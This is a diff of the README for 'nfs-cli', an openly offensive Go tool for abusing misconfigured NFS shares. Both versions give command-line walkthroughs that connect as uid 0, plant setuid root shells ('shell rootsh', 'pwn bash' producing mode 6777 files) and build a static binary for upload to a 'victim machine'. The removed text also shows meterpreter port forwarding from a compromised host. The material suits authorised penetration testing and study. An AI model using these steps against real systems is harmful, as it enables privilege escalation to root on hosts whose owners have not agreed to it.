@@ -1,101 +1,82 @@
-# nfs-cli
+Simple CLI for NFS.
 
-Simple cli for nfs. No NFS permissions are bypassed or anything. This is not an exploit. You can set machine identifier, uid and gid though.
+Contains some commands that makes exploiting serious misconfigurations a bit quicker.
 
-Also, just in case the permissions aren't all that great there are some nice pwn features available.
+- Will not work with proxychains
+- Works great with ligolo-ng
+- Port forwarding should work fine, allows setting custom ports for portmapper/mountd/nfs
 
-(And no, this doesn't work through a socks proxy, as go doesn't obey proxychains. Works fine with ligolo-ng though.)
-
-It really shines when built static and uploaded to a victim machine, or when we have direct access to a NFS share.
+Based on native Go library <github.com/willscott/go-nfs-client>, so should work fine on Windows.
 
 ## Usage
+Showmount:
 ```sh
-nfs-cli <rhost> <path> -u 0:0
+nfs-cli --showmount nfs-server.corp.local
+- /exports/home (192.168.0.0/255.255.0.0)
 ```
-Use `-h` for help.
 
-Build static (for infil):
+CLI:
 ```sh
-CGO_ENABLED=0 go build -a -ldflags '-extldflags "-static"' .
+nfs-cli --uid 0 --gid 0 nfs-server.corp.local /exports/home
+(/exports/home) / >> mkdir pwnshell
+(/exports/home) / >> cd pwnshell
+(/exports/home) /pwnshell >> shell rootsh
+(/exports/home) /pwnshell >> ls
+06777 (-rwsrwsrwx )  0      0      148     2026-01-01T00:00:01+01:00  [rootsh]*
 ```
 
-Pretty sure you need to use the `-u` switch if you are running this in Windows. Can't really see that working.
-
-### Commands
-Note: Don't include slashes in paths, this tool is pretty dumb.
-
-- `attr [path]` - get attributes for filesystem object (can be used to determine the owner of the share)
-- `ls` - list files i cwd
-- `cd newdir` - change cwd
-- `mkdir newdir` - create a directory (mode `06777`)
-- `rmdir dir` - delete directory (and recursive)
-
-- `cat file` - view file
-- `b64get file` - download file "visually" in base64 format
-- `get file` - download file
-
-- `put file` - upload file (mode `06777`)
-- `b64put file` - will prompt for base64 input and upload (mode `06777`)
-- `type file` - allows for manual file upload (mode `06777`)
-- `rm file` - delete file
-
-- `pwn file` - copies `file` to `file.pwn` and sets mode `06777`
-- `shell file` - creates a minimal rootshell (if allowed)
-
-The suid-bit doesn't work unless you are root, not sure if this is nfs or the library.
-
-## Example
-Metasploit:
-```
-# we can't forward listening sockets
-sudo systemctl stop portmap
-sudo systemctl stop rpcbind.socket
-
-sudo msfconsole -q   # 111 is privileged, see below for workaround
-...
-meterpreter > shell
-Process XYZ created.
-Channel ZYX created.
-$ rpcinfo
-   program vers proto   port  service
-   ...
-    100005    2   tcp  20048  mountd      <--this is the portnumber you want
-   ...
-$ exit
-meterpreter > portfwd add -l 111 -L 0.0.0.0 -p 111 -r 127.0.0.1
-meterpreter > portfwd add -l 2049 -L 0.0.0.0 -p 2049 -r 127.0.0.1
-meterpreter > portfwd add -l 20048 -L 0.0.0.0 -p 20048 -r 127.0.0.1
+If extra arguments are provided, these will be parsed instead of reading from the CLI (EOF is expected):
+```sh
+nfs-cli nfs-server.corp.local /exports/home --uid 0 --gid 0 'mkdir pwnshell' 'cd pwnshell' 'shell rootsh' 'ls'
+06777 (-rwsrwsrwx )  0      0      148     2026-01-01T00:00:01+01:00  [rootsh]*
+2026/01/01 00:00:01 error: EOF
 ```
 
-Client:
+### Flags
 ```
-./nfs-cli -u 0:0 localhost /home/james
-/home/james$ ls
-       0     0     0        0 | Mon Jan  1 00:00:00 0001  [.]
-       0     0     0        0 | Mon Jan  1 00:00:00 0001  [..]
-     755  1000  1000  1183448 | Mon Jan  9 23:12:03 2023  [bash]
-/home/james$ pwn bash
-/home/james$ ls
-       0     0     0        0 | Mon Jan  1 00:00:00 0001  [.]
-       0     0     0        0 | Mon Jan  1 00:00:00 0001  [..]
-     755  1000  1000  1183448 | Mon Jan  9 23:12:03 2023  [bash]
-    6777     0     0  1183448 | Mon Jan  9 23:13:49 2023  [bash.pwn]
-/home/james$ shell iamroot
-/home/james$ ls
-       0     0     0        0 | Mon Jan  1 00:00:00 0001  [.]
-       0     0     0        0 | Mon Jan  1 00:00:00 0001  [..]
-     755  1000  1000  1183448 | Mon Jan  9 23:12:03 2023  [bash]
-    6777     0     0  1183448 | Mon Jan  9 23:13:49 2023  [bash.pwn]
-    6777     0     0      163 | Mon Jan  9 23:14:25 2023  [iamroot]
+  -d, --debug                 enable debugging
+      --fh string             specify file handle in binary hex notation (will skip mountd interaction)
+  -g, --gid int               group id (default 1000)
+  -h, --help                  help for nfs-cli
+  -m, --machine string        machine name (default "localhost")
+      --mountd-port int       mountd port
+      --nfs-port int          nfs port
+      --portmapper-port int   portmapper port (default 111)
+  -p, --privileged            use privileged port (usually requires root)
+      --showmount             list exported filesystems and exit
+      --timeout duration      timeout for nfs operations (default 10s)
+  -u, --uid int               user id (default 1000)
 ```
 
-## Alternative usage (non-priv)
+### Available Commands
 ```
-git clone https://github.com/go-nfs/nfsv3.git
-cd nfsv3
-# copy the go files here
-# edit nfs/rpc/portmap.go and change PmapPort to 9111
-go run . -h
+  attr        Displays some file information, similar to stat
+  cat         Downloads a file to stdout
+  cd          Change directory
+  get         Download a file
+  help        Help about any command
+  lcd         Change local directory
+  ln          Create a symlink
+  ls          List files in directory
+  mkdir       Create a directory
+  mv          Renames a file
+  put         Uploads a file (or from stdin)
+  pwd         Print working directory
+  pwn         Turn any file into a suid binary
+  rm          Remove a file
+  rmdir       Removes a directory
+  setattr     Sets attributes for a file entry
+  shell       Drop a suid shell
 ```
 
-Now it's possible to `portfwd add -l 9111 -L 0.0.0.0 -p 111 -r 127.0.0.1` instead. No need to run `msfconsole` as root.
+## Building
+```sh
+go build .
+
+GOOS=windows go build .
+```
+
+Or static:
+```sh
+CGO_ENABLED=0 go build -a -trimpath -ldflags '-s -X main.version= -buildid= -extldflags "-static"' .
+```
